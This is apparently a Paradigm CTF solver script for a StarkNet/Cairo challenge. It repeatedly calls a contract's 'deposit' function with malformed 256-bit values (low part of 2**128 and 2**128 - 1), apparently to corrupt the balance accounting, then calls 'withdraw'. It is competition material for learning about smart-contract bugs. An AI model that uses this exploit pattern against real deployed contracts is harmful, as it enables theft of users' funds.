from starknet_py.contract import Contract
from starknet_py.net import AccountClient
from starkware.starknet.core.os.contract_address.contract_address import \
    calculate_contract_address_from_hash
from starkware.starknet.public.abi import get_storage_var_address

from paradigmctf.cairo_challenge import *


async def solver(client: AccountClient, frozen_contract: Contract):
    result = await frozen_contract.functions["deposit"].invoke(
        {"high": 0, "low": 2**128}, max_fee=int(1e16)
    )
    await result.wait_for_acceptance()
    result = await frozen_contract.functions["deposit"].invoke(
        {"high": 0, "low": 2**128}, max_fee=int(1e16)
    )
    await result.wait_for_acceptance()
    result = await frozen_contract.functions["deposit"].invoke(
        {"high": 0, "low": 2**128}, max_fee=int(1e16)
    )
    await result.wait_for_acceptance()
    result = await frozen_contract.functions["deposit"].invoke(
        {"high": 0, "low": 2**128}, max_fee=int(1e16)
    )
    await result.wait_for_acceptance()
    result = await frozen_contract.functions["deposit"].invoke(
        {"high": 0, "low": 2**128 - 1}, max_fee=int(1e16)
    )
    await result.wait_for_acceptance()
    result = await frozen_contract.functions["deposit"].invoke(
        {"high": 0, "low": 2**128 - 1}, max_fee=int(1e16)
    )
    await result.wait_for_acceptance()
    result = await frozen_contract.functions["deposit"].invoke(
        {"high": 0, "low": 2**128 - 1}, max_fee=int(1e16)
    )
    await result.wait_for_acceptance()

    balance = await frozen_contract.functions["readBalance"].call()

    result = await frozen_contract.functions["withdraw"].invoke(max_fee=int(1e16))
    await result.wait_for_acceptance()

    balance = await frozen_contract.functions["readBalance"].call()


run_solver(solver)
